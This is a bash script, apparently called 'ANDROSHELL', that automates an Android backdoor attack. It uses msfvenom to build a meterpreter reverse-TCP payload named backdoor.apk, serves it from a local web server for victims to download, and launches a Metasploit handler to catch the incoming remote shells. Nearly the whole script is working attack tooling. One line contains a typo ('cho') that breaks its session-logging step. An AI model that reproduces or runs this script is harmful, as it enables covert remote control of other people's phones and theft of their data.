#!/bin/bash

# Cleanup on exit (success, failure, or Ctrl+C)
trap 'rm -f "$exploitshell"' EXIT

sleep 3
clear
echo ""
cat << 'EOF'
 _______  _        ______   _______  _______  _______           _______  _        _       
(  ___  )( (    /|(  __  \ (  ____ )(  ___  )(  ____ \|\     /|(  ____ \( \      ( \      
| (   ) ||  \  ( || (  \  )| (    )|| (   ) || (    \/| )   ( || (    \/| (      | (      
| (___) ||   \ | || |   ) || (____)|| |   | || (_____ | (___) || (__    | |      | |      
|  ___  || (\ \) || |   | ||     __)| |   | |(_____  )|  ___  ||  __)   | |      | |      
| (   ) || | \   || |   ) || (\ (   | |   | |      ) || (   ) || (      | |      | |      
| )   ( || )  \  || (__/  )| ) \ \__| (___) |/\____) || )   ( || (____/\| (____/\| (____/\
|/     \||/    )_)(______/ |/   \__/(_______)\_______)|/     \|(_______/(_______/(_______/
EOF
echo ""
echo ""
echo "Gathering attacker system IP... "
sleep 1
echo "ip found.."
sleep 1
lhost=$(ip -4 addr show | grep inet | awk '{print $2}' | cut -d/ -f1 | grep -v 127.0.0.1 | head -n 1)
read -p "Enter port to receive the reverse shell: " lport
echo "Attacker machine IP : $lhost"
echo "Port : $lport"

directory_in_use=$(pwd)
msfvenom -p android/meterpreter/reverse_tcp LHOST="$lhost" LPORT="$lport" -o "$directory_in_use/backdoor.apk" > /dev/null 2>&1
sudo cp "$directory_in_use/backdoor.apk" /var/www/html/
echo "Payload created and stored for web level deployment..."
sleep 2
service httpd start
sleep 1
echo "Successfully serving the payload on HTTP server..."

exploitshell="exploit.rc"
echo "use exploit/multi/handler" > "$exploitshell"
echo "set PAYLOAD android/meterpreter/reverse_tcp" >> "$exploitshell"
echo "set LHOST $lhost" >> "$exploitshell"
echo "set LPORT $lport" >> "$exploitshell"
echo "sleep 5" >> "$exploitshell"
echo "clear" >> "$exploitshell"
echo "exploit -j -z" >> "$exploitshell"   # -j background, -z don't interact
echo "sleep 10" >> "$exploitshell"
cho "sessions -l > /tmp/msf_sessions.txt" >> "$exploitshell"
echo "exit -y" >> "$exploitshell"
echo "EXPLOIT CONFIG SCRIPT GENERATED..."
echo ""
fuser -k ${lport}/tcp 2>/dev/null
sleep 1

msfconsole -q -r "$exploitshell"

if [ ! -f /tmp/msf_sessions.txt ] || grep -q "No active sessions" /tmp/msf_sessions.txt; then
    echo ""
    echo "[!] No meterpreter session established. Terminating..."
    rm -f /tmp/msf_sessions.txt
    exit 1
else
    echo ""
    echo "[+] Session established!"
    rm -f /tmp/msf_sessions.txt
fi
